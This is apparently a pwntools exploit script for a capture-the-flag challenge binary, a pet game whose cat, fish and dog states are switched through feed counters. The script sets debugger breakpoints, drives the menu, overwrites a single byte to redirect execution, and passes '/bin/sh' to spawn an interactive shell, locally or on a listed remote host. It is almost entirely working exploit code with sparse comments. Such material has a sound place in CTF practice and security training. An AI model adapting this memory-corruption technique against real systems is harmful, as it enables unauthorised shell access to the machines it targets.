#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "35.247.131.2"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000001E18

            # feed
            brva 0x0000000000001955

            # show
            brva 0x0000000000001A26
            brva 0x000000000000157A
            brva 0x0000000000001554

            # play_as_fish
            brva 0x0000000000001C31
            brva 0x0000000000001CA9

            # play_as_dog
            brva 0x0000000000001BCD
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(color, name=b'abcd'):
	p.sendlineafter(b'choice: ', str(1))
	p.sendlineafter(b'Fish\n', str(2))
	p.sendlineafter(b'White\n', str(color))
	p.sendlineafter(b'name:', name)

def feed(idx, num):
	p.sendlineafter(b'choice: ', str(2))
	p.sendlineafter(b'number:', str(idx))
	p.sendlineafter(b'food? ', str(num))

def poop(idx):
	p.sendlineafter(b'choice: ', str(3))
	p.sendlineafter(b'number:', str(idx))

def show():
	p.sendlineafter(b'choice: ', str(4))

def play_as_fish(idx, data=b'abcd', train=True):
	p.sendlineafter(b'choice: ', str(5))
	p.sendlineafter(b'number:', str(idx))
	if train:
		p.sendlineafter(b'(Y/N) ', b'y')
	else:
		p.sendlineafter(b'(Y/N) ', b'n')
		p.sendlineafter(b'area:', data)

def play_as_dog(idx, data):
	p.sendlineafter(b'choice: ', str(5))
	p.sendlineafter(b'number:', str(idx))
	p.sendlineafter(b'(Y/N) ', b'y')
	p.sendlineafter(b'color: ', data)

# VARIABLE


# PAYLOAD
# only choose cat
add(1)
# cat -> fish: 2 + 1 = 3
feed(1, 0x100)
# we have address at ptr+24
play_as_fish(1, train=True)
# fish -> dog: 0x300 + 0xfe00 = 0x10100
feed(1, 0xfe00)
payload = b'a'*6 + b'\x83'
play_as_dog(1, payload)
# dog -> fish: 1 + 2 = 3
feed(1, 0x200)
play_as_fish(1, b'/bin/sh\0', train=False)

p.interactive()